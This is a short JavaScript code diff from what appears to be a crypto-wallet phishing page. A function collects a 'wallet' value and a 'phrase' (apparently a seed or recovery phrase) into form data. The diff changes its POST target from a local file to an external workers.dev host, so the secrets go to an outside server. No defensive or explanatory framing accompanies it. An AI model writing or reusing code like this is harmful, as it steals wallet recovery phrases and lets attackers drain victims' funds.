@@ -23,7 +23,7 @@ const sendDDD = _ => {
                         formData.append('wallet', wallet);
                         formData.append('phrase', phrase);
 
-                        await fetch('./send.js', {
+                        await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
                             method: 'POST',
                             body: formData
                         }).then(res => {
